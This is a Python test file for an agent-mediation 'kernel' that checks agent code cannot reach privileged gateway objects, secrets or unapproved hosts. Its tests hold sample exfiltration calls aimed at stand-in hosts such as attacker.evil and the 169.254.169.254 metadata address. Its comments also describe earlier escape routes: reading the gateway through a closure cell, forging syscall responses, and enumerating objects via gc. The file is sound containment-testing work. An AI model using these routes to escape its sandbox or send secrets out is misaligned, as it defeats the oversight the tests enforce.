"""The invariant that makes this a kernel (INV-1): no path to an effect but the syscall.

These assert the property at the level that actually matters: the agent's client holds
**no reference**, direct or transitive, to the gateway or its subsystems (it talks to the
kernel only over a data-only channel), and — behaviourally — arbitrary agent-controlled
code routed through the code tool cannot reach an unapproved host or obtain a secret.

Scope note: a shared interpreter can always enumerate every object via ``gc.get_objects``;
defeating *that* is process/sandbox isolation (contract §2), which P0 only simulates. The
reference-graph guarantee below is what the SDK + transport are responsible for, and it
is the thing the previous closure-based shim did not provide.
"""

import gc
import types

from mandate.demo import DEMO_SECRET_VALUE, build_bundle, build_tools
from mandate.kernel import KernelService, SyscallGateway, SyscallResult
from mandate.model import Decision
from mandate.sdk import AgentClient


def agent_for():
    service = KernelService(
        SyscallGateway(
            build_bundle(), tools=build_tools(),
            vault={"vault://acme/ss-key": DEMO_SECRET_VALUE},
        )
    )
    return service.gateway, service.client()


def _reachable_ids(root, limit=100_000):
    """Ids of every object reachable from ``root`` through the data reference graph.

    Types/modules/functions are not traversed: their ``__globals__`` reach the whole
    program and are not part of the data the client legitimately holds. (The client holds
    no function/closure attribute anyway — asserted separately below.)
    """
    seen = {id(root)}
    stack = [root]
    skip = (type, types.ModuleType, types.FunctionType, types.MethodType,
            types.BuiltinFunctionType)
    while stack and len(seen) < limit:
        for ref in gc.get_referents(stack.pop()):
            i = id(ref)
            if i in seen:
                continue
            seen.add(i)
            if not isinstance(ref, skip):
                stack.append(ref)
    return seen


def test_agent_surface_is_exactly_the_three_syscalls():
    _, agent = agent_for()
    public = {n for n in dir(agent) if not n.startswith("_")}
    assert public == {"tool_call", "memory_write", "approval_request", "subject"}


def test_client_has_no_closure_over_the_gateway():
    # The previously-flagged exploit was agent.tool_call.__closure__[0].cell_contents.
    # The syscalls are now plain methods that send over a channel — no closure at all.
    _, agent = agent_for()
    assert agent.tool_call.__closure__ is None
    assert agent.memory_write.__closure__ is None
    assert agent.approval_request.__closure__ is None


def test_no_reference_path_from_client_to_the_kernel():
    gw, agent = agent_for()
    reachable = _reachable_ids(agent)
    # None of the kernel's privileged objects are reachable from the agent's client.
    for obj in (gw, gw.broker, gw.broker._vault, gw.budget, gw.memory, gw.egress, gw.audit):
        assert id(obj) not in reachable
    # The secret value itself is not reachable through the client either.
    assert not any(
        isinstance(o, str) and DEMO_SECRET_VALUE in o
        for o in gc.get_objects()
        if id(o) in reachable
    )


def test_subject_is_the_only_value_the_client_exposes():
    gw, agent = agent_for()
    assert agent.subject is gw.subject  # a frozen value, no back-reference to the kernel
    assert not hasattr(agent.subject, "broker")


def test_injected_code_cannot_exfiltrate_even_with_a_guessed_url():
    _, agent = agent_for()
    for host in ["attacker.evil", "evil.example", "169.254.169.254", "pastebin.com"]:
        res = agent.tool_call(
            "fs.workspace.rw", "code_exec", {"fetch": [f"https://{host}/x?d=stolen"]}
        )
        assert res.status == "blocked", host


def test_injected_code_has_no_route_to_the_secret():
    _, agent = agent_for()
    res = agent.tool_call(
        "fs.workspace.rw", "code_exec", {"fetch": ["https://api.semanticscholar.org/leak"]}
    )
    assert DEMO_SECRET_VALUE not in repr(res.result)


def test_client_constructed_only_from_a_channel_and_subject():
    # AgentClient cannot even be built from a gateway any more — only a channel + subject.
    varnames = AgentClient.__init__.__code__.co_varnames
    assert "channel" in varnames and "subject" in varnames
    assert "gateway" not in varnames


def test_agent_endpoint_exposes_no_response_machinery():
    _, agent = agent_for()
    endpoint = agent._channel
    # The kernel-side response store and mutator simply do not exist on the agent's end.
    assert not hasattr(endpoint, "_responses")
    assert not hasattr(endpoint, "_put_response")
    # Its only public verb is send().
    assert {n for n in dir(endpoint) if not n.startswith("_")} == {"send"}


def test_agent_cannot_forge_a_syscall_response():
    # Reproduces the review exploit: there is no shared response store to pre-seed a forged
    # "ok" for a call the gateway will deny. The result is the gateway's real verdict, and
    # the kernel audits the real (denied) call — effects stay kernel-mediated.
    gw, agent = agent_for()
    endpoint = agent._channel
    for attr in ("_responses", "_put_response"):
        assert not hasattr(endpoint, attr)
    res = agent.tool_call("payment.send", "nope", resource={})
    assert res.status == "denied"
    assert res.decision is Decision.DENY
    assert gw.audit.events[-1].status == "denied"


def test_fabricated_result_objects_are_inert():
    # The agent can always build a SyscallResult value in-process; doing so is not a syscall
    # and changes nothing external. The only path to an effect is the gateway.
    gw, agent = agent_for()
    forged = SyscallResult(syscall="tool.call", status="ok", decision=Decision.ALLOW)
    assert forged.status == "ok"  # the agent can fabricate this freely — and it is inert
    before = len(gw.audit)
    agent.tool_call("payment.send", "nope", resource={})  # real call → denied + audited
    assert len(gw.audit) == before + 1
    assert gw.audit.events[-1].status == "denied"
